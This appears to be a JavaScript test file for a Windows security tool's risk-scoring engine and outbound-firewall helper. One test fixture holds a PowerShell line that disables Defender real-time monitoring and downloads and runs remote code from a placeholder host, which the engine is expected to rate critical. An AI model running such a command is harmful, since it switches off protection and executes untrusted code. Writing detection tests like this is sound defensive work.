"use strict";
const assert = require("assert");
const fs = require("fs");
const { calculateLayeredRisk, reconcileVerdicts, hasDoubleExtensionLure } = require("./protect-layered-engine.cjs");
const {
  RULE_PREFIX,
  ruleIdForPath,
  isManagedRuleName,
  blockProgramScript,
  removeProgramBlockScript,
  installForegroundBridge,
} = require("./protect-firewall.cjs");

assert.equal(hasDoubleExtensionLure("invoice.pdf.exe"), true);
assert.equal(hasDoubleExtensionLure("normal-installer.exe"), false);

const benign = calculateLayeredRisk({ fileName: "signed.exe", signatureValid: true, trustScore: 82, size: 4_000_000 });
assert.equal(benign.shouldEscalateDefender, false);

const tamper = calculateLayeredRisk({
  fileName: "invoice.pdf.ps1",
  signatureValid: false,
  trustScore: 20,
  scriptText: "Set-MpPreference -DisableRealtimeMonitoring $true; IEX (Invoke-WebRequest https://example.invalid/p).Content",
  size: 1200,
});
assert.equal(tamper.severity, "critical");
assert.equal(tamper.shouldEscalateDefender, true);
assert.equal(tamper.shouldContainNetwork, true);

const reconciled = reconcileVerdicts({ firstPass: tamper, secondPass: tamper, defenderDetected: false });
assert.equal(reconciled.verdict, "protect-only-critical");

const defender = reconcileVerdicts({ firstPass: benign, secondPass: benign, defenderDetected: true });
assert.equal(defender.verdict, "defender-confirmed");

// Firewall companion guardrails.
const rule = ruleIdForPath("C:\\Games\\Example\\game.exe");
assert.ok(rule.startsWith(RULE_PREFIX));
assert.equal(isManagedRuleName(rule), true);
assert.equal(isManagedRuleName("SomeOtherFirewallRule"), false);
assert.match(blockProgramScript(), /Direction Outbound/i);
assert.match(blockProgramScript(), /Action Block/i);
assert.doesNotMatch(blockProgramScript(), /Action Allow/i);
assert.match(removeProgramBlockScript(), /Remove-NetFirewallRule/i);
assert.equal(typeof installForegroundBridge, "function");

const preload = fs.readFileSync("./preload.cjs", "utf8");
assert.match(preload, /protectFirewallGetStatus/);
assert.match(preload, /protectFirewallSelectProgram/);
assert.match(preload, /protectFirewallBlockSelected/);
assert.match(preload, /protectFirewallRemoveRule/);
assert.match(preload, /protectFirewallOpenWindows/);

const bootstrap = fs.readFileSync("./bootstrap-utf8.cjs", "utf8");
assert.match(bootstrap, /installForegroundBridge/);

const firewallSource = fs.readFileSync("./protect-firewall.cjs", "utf8");
assert.match(firewallSource, /VOXARIO FIREWALL/);
assert.match(firewallSource, /dataset\.tab = "firewall"/);
assert.match(firewallSource, /USER-CONFIRMED BLOCK/);
assert.match(firewallSource, /defenderAuthoritative/);

console.log("VoxarioProtect layered engine + firewall companion tests passed.");
